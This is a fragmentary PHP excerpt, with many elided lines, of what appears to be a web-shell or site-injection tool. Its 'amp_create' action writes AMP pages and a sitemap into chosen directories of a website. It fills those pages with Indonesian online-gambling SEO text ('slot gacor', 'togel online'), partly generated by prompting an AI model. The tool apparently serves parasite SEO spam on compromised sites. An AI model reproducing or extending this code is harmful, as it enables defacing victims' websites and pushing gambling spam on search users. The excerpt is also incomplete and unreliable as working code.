...
function td_actions() {
        ...
        foreach ($targets as $tidx => $t) {
            ...
            if ($isIndex) {
                ...
                if ($title === '') {
                    ...
                    $kw    = $kws[$tidx%count($kws)];
                    $title = $cpBrand.' - '.$kw.' '.date('Y');
                    if (strlen($title)>65) $title = $cpBrand.' '.$kw.' '.date('Y');
                    if (strlen($title)>65) $title = $kw.' '.date('Y').' - Daftar & Menang';
                }
                if ($desc === '') $desc = 'Mainkan slot gacor dan togel online terpercaya bersama '.$cpBrand.'. RTP tertinggi, jackpot terbesar, bonus new member, withdraw tercepat. Daftar sekarang!';
                if ($h1  === '') $h1   = $cpBrand.' - '.ucwords($kwPick).' Terpercaya '.date('Y');
            }
    ...
    if ($act==='amp_create' && isset($_POST['amp_brand'],$_POST['amp_daftar'])) {
        $root     = td_root();
        ...
        foreach ($rawDirs as $rd) {
            $rd   = trim(td_san($rd));
            $full = rtrim($root,'/').'/'.ltrim(str_replace('\\','/',$rd),'/');
        ...
        if (empty($targets)) {
            return array('type'=>'error','text'=>'&#x274C; Tidak ada direktori dipilih atau tidak ditemukan. Centang minimal 1 direktori.');
        }
        ...
        foreach ($targets as $idx => $t) {
            $dirRel = '/'.trim(str_replace(rtrim($root,'/'), '', $t), '/').'/';
            $dirUrl = $scheme.'://'.$host.$dirRel;
            ...
            $prompt .= ' Path halaman: "'.$dirRel.'" (konteks: '.$pathSeg.'). Kata kunci: "'.$kwPick.'".';
            $prompt .= ' Buat 4 elemen bahasa Indonesia baku tanpa typo:';
            $prompt .= ' 1.title: FORMAT "'.$brandName.' - [keyword] [tahun]", 50-65 karakter.';
            $prompt .= ' 2.description: 140-155 karakter, sebut brand, keyword natural, ajakan bertindak.';
            $prompt .= ' 3.h1: 40-60 karakter, sebut brand, keyword, berbeda dari title.';
            $prompt .= ' 4.cta: 2-4 kata tombol unik (MAIN SEKARANG/KLAIM BONUS/DAFTAR VIP/SPIN GACOR).';
            ...
            $kws = array('Slot Gacor','Togel Online','Slot Online','RTP Tertinggi','Jackpot Terbesar');
            $kw  = $kws[$idx % count($kws)];
            if ($title === '') $title = $brandName.' - '.$kw.' '.date('Y');
            if ($desc  === '') $desc  = 'Mainkan slot gacor bersama '.$brandName.'. RTP tertinggi, jackpot terbesar, bonus new member. Daftar sekarang!';
            if ($h1    === '') $h1    = $brandName.' '.ucwords($kwPick).' '.date('Y');
  ...
  <main>
    ...
    <div class="bottom-navbar" id="bottom-navbar">
      <ul>
        ...
        $msg = array(
            'type'    => 'tunel',
            'text'    => '&#x26A1; AMP CREATE: '.$ok.' file dibuat'.($fail?' | Gagal: '.$fail:'').'. Sitemap: sitemap-amp.xml',
            'urls'    => $urlHtml,
            'count'   => count($uploadedUrls),
            'rawurls' => implode("\n",array_map(function($u){return $u['url'];},$uploadedUrls)),
        );
